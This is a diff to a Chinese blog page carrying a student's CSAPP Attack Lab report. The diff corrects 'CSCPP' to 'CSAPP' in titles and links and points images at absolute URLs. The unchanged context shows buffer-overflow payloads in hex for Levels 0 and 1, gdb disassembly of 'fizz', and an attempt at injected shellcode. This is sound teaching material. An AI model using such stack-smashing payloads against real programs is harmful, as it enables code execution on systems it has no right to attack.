@@ -18,7 +18,7 @@
   <meta name="author" content="Edwardzcn">
   <meta name="keywords" content="Edward&#39;s blog">
   
-  <title>CSCPP——Attack Lab Report - Edward&#39;s blog</title>
+  <title>CSAPP——Attack Lab Report - Edward&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -227,7 +227,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="CSCPP——Attack Lab Report">
+            <span class="h2" id="subtitle" title="CSAPP——Attack Lab Report">
               
             </span>
 
@@ -294,7 +294,7 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CSCPP——Attack Lab Report</h1>
+            <h1 style="display: none">CSAPP——Attack Lab Report</h1>
             
             <div class="markdown-body">
               <h1 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h1><p>姓名：张**</p>
@@ -315,14 +315,14 @@
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>20 8e 04 08 00 00 00 00<br></code></pre></td></tr></table></figure>
 <p><code>./sendstring &lt;exploit.txt&gt; exploit-test.txt</code> 使用工具构造输入。</p>
 <p>实验结果:</p>
-<p><img src="./candle.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://eddyblog.edwardzcn98yx.com/CSAPP/candle.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <h3 id="Level-1-Sparker"><a href="#Level-1-Sparker" class="headerlink" title="Level 1: Sparker"></a>Level 1: Sparker</h3><p>和 Level 0 要求类似，这次要求返回到<code>fizz</code>函数并传入参数，反汇编结果如下：</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs txt">(gdb) disas fizz<br>Dump of assembler code for function fizz:<br>   0x08048dc0 &lt;+0&gt;:     push   %ebp<br>   0x08048dc1 &lt;+1&gt;:     mov    %esp,%ebp<br>   0x08048dc3 &lt;+3&gt;:     push   %ebx<br>   0x08048dc4 &lt;+4&gt;:     sub    $0x14,%esp<br>   0x08048dc7 &lt;+7&gt;:     mov    0x8(%ebp),%ebx<br>   0x08048dca &lt;+10&gt;:    movl   $0x1,(%esp)<br>   0x08048dd1 &lt;+17&gt;:    call   0x80489a0 &lt;entry_check&gt;<br>   0x08048dd6 &lt;+22&gt;:    cmp    0x804a1cc,%ebx<br>   0x08048ddc &lt;+28&gt;:    je     0x8048e00 &lt;fizz+64&gt;<br>   0x08048dde &lt;+30&gt;:    mov    %ebx,0x4(%esp)<br>   0x08048de2 &lt;+34&gt;:    movl   $0x8049898,(%esp)<br>   0x08048de9 &lt;+41&gt;:    call   0x8048764 &lt;printf@plt&gt;<br>   0x08048dee &lt;+46&gt;:    movl   $0x0,(%esp)<br>   0x08048df5 &lt;+53&gt;:    call   0x80487a4 &lt;exit@plt&gt;<br>   0x08048dfa &lt;+58&gt;:    lea    0x0(%esi),%esi<br>   0x08048e00 &lt;+64&gt;:    mov    %ebx,0x4(%esp)<br>   0x08048e04 &lt;+68&gt;:    movl   $0x8049a29,(%esp)<br>   0x08048e0b &lt;+75&gt;:    call   0x8048764 &lt;printf@plt&gt;<br>   0x08048e10 &lt;+80&gt;:    movl   $0x1,(%esp)<br>   0x08048e17 &lt;+87&gt;:    call   0x8048ae0 &lt;validate&gt;<br>   0x08048e1c &lt;+92&gt;:    jmp    0x8048dee &lt;fizz+46&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure>
 <p>阅读<code>fizz</code>的反汇编可知，压入调用者旧<code>%ebp</code>，该位置也为覆盖的返回地址，此时应该为 fizz 的起始地址，<code>%ebp+4</code>存放的是正常调用 fizz 的返回地址，而参数的地址应该为<code>%ebp+0x8</code>的位置，我们只需要将自己的 cookie 放置在该位置即可。</p>
 <p>所以我们需要构造字符串十六进制表示:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>c0 8d 04 08 00 00 00 00<br>cf f0 2e 2a 00 00 00 00<br></code></pre></td></tr></table></figure>
 <p>实验结果:</p>
-<p><img src="./sparkler.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://eddyblog.edwardzcn98yx.com/CSAPP/sparkler.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <blockquote>
 <p>注：在 32 位的程序里面，我们可以往返回地址后面写上 cookie 作为参数，但是 64 位程序前 6 个参数采用寄存器传参，那么要成功攻击就必须修改 rdi 寄存器的值为 cookie</p>
 <p>做了一些额外的尝试<br>汇编注入编写如下汇编代码</p>
@@ -333,7 +333,7 @@
 <p>构造</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">bf cf f0 2e 2a 68 c0 8d<br>04 08 c3 00 00 00 00 00<br>3c b5 ff ff<br></code></pre></td></tr></table></figure>
 <p>实验结果</p>
-<p><img src="wrong.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://eddyblog.edwardzcn98yx.com/CSAPP/wrong.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>从实验结果看，尝试的注入成功，也跳转到了构造的指令处，但是执行会报段错位（应该是 IA32 和 x84-64 的一些区别）</p>
 <p>本实验完成的实验结果见上面栈填充的结果图</p>
 </blockquote>
@@ -380,7 +380,7 @@
                     
                     
                       <a href="/post/2340d9af.html">
-                        <span class="hidden-mobile">CSCPP——Bomb Lab Report</span>
+                        <span class="hidden-mobile">CSAPP——Bomb Lab Report</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -407,7 +407,7 @@
       {"host":"https://remark42.edwardzcn98yx.com","site_id":"www.edwardzcn98yx.com","max_shown_comments":20,"locale":"zh","components":["embed"]},
       {
         url: '/post/b63aaadb.html',
-        page_title: 'CSCPP——Attack Lab Report',
+        page_title: 'CSAPP——Attack Lab Report',
         theme: schema,
       }
     );
